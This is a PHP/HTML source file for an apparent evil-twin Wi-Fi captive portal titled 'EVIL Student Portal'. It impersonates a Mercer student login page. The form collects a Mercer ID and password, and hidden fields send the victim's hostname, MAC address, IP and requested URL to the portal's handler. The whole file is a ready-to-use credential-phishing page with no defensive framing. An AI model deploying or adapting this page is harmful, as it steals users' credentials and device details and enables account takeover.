<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

  <html>

  <head>

    <title>Login to EVIL Student Portal</title>

    <meta charset='UTF-8'>
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">

    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>

    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="icon" type="image/png" href="assets/img/s5g1cxz9vr.png"/>

    <style>
        .login_bg
        {
         background-color: #ffffff !important;
        }
      
        .Mercerfooter
        {
         //background-color: var(--dark) !important;
    		 width: 100%;
    		 height: 30px;
    		 bottom: 0px;
    		 left: 0px;
    		 position: fixed;
    		 color: #666;
    		 text-align: right;
    		 float:left;
        }

         body {
            margin: 0;
            font-family: open_sansregular;
        }
    </style>

     <script>
        // ===== Scroll to Top ==== 
        $(document)
            .ready(function () {
                $(window)
                    .scroll(function () {
                        if ($(this).scrollTop() >= 50) { // If page is scrolled more than 50px
                            $('#return-to-top').fadeIn(200); // Fade in the arrow
                        } else {
                            $('#return-to-top').fadeOut(200); // Else fade out the arrow
                        }
                    });
                $('#return-to-top')
                    .click(function () { // When arrow is clicked
                        $('body,html,#wrapper')
                            .animate({
                                scrollTop: 0 // Scroll to top of body
                            },
                                100);
                    });
            });
    </script>
<body class="login_bg">
  <div class="content">
                <div class="container-fluid">

    <div id="ContentPlaceholder_pnlLoginInfo">
	
	<nav class="navbar navbar-default">
                        <img src="assets/img/pa6dyy5wcc.png" id="imgLogo" alt="Logo Image" border="0">
            </nav>

        <div class="container-fluid">
            <div class="row">
                <div class="col-sm-9">
                    <div class="row headerBar">
                    </div>
                </div>
                <div class="col-sm-12 back_home">
                </div>
            </div>
            <div class="row">
                <div class="clearfix">

                    <div class="col-md-6 col-md-push-3 login_box">
                        <div class="">
                            <div class="panel-body">
                                <div class="">
                                    <div class="row">
                                        <div class="col-lg-12 zeropad has-error">
                                            <span id="ContentPlaceholder_Label4" class="control-label"></span>
                                        </div>
                                    </div>
                                </div>
                                 
                                <div id="ContentPlaceholder_pnlLogin">
		
                                    <div class="">
                                        <div class="panel panel-default panel-border">
                                            <div class="panel-body form-horizontal login_panel">
                                                <div class="row" style="display: none;">
                                                    <div class="bg-info msg_tab">
                                                        <i class="fa fa-sign-in" aria-hidden="true"></i>
                                                        <span id="ContentPlaceholder_lblPleaseLogin"></span>
                                                    </div>
                                                </div>
                                                <div class="form-group">
												<!--Adds the login graphic-->					
<img src="assets/img/pa6dyy5wcc.png" width="500" alt="NO Image" class="img-responsive login_img" id="loginImg" title=" " />									
<!--End: Adds the login graphic-->
                                                    <span>
                                                        <span id="ContentPlaceholder_lblRequired" class="control-label">Required Field</span>
                                                    </span>
                                                    <sup><i class="fa fa-star text-danger" aria-hidden="true"></i></sup>
                                                    <div class="col-lg-12 zeropad has-error" aria-live="assertive" role="alert" aria-relevant="additions">
                                                        
                                                    </div>
                                                </div>
                                                <div class="form-group">
<p class="col-sm-4 alignment">
	<label for="ContentPlaceholder_txtUserName" id="ContentPlaceholder_Label1" class="control-label">Mercer ID</label>

	<sup><i class="fa fa-star text-danger" aria-hidden="true"></i></sup>
</p>
<div class="col-sm-6">
  <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
    <input type="text" name="id" class="form-control" placeholder="Id" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
	
<div>
<span>Enter your 8 digit Mercer ID</span>
</div>
</div>
                                                </div>
                                                <div class="form-group">
                                                    <p class="col-sm-4 alignment">
                                                        <label for="ContentPlaceholder_txtPassword" id="ContentPlaceholder_Label2" class="control-label" style="font-weight:bold;">Password</label>
                                                        <sup><i class="fa fa-star text-danger" aria-hidden="true"></i></sup>
                                                    </p>
                                                    <div class="col-sm-6">
                                                        <input type="password" name="password" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
                                                        

                                                        <div>
                                                            <span>Password is case sensitive</span>
                                                        </div>
                                                        <div aria-live="assertive" role="alert" aria-relevant="additions">
                                                        
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="form-group">
                                                    <div class="col-sm-12 center create_forgot">
                                                        
                                                        
                                                        <a id="ContentPlaceholder_lnkForgotpwd">Forgot your Password</a>
                                                      </div>

                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                
	</div>
                                
                            </div>
                        </div>
                    </div>
                    
                </div>
            </div>
        </div>
    
</div>

<div class="Mercerfooter">
                        <span id="ContentPlaceholder_lblTest">Chip  </span>
           	 </div>

                    <a href="#wrapper" id="return-to-top">
                        <i class="fa fa-arrow-up" aria-hidden="true"></i>
                    </a>
                </div>
            </div>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">

          </form>

      </div>
    </div>

  </body>

</html>
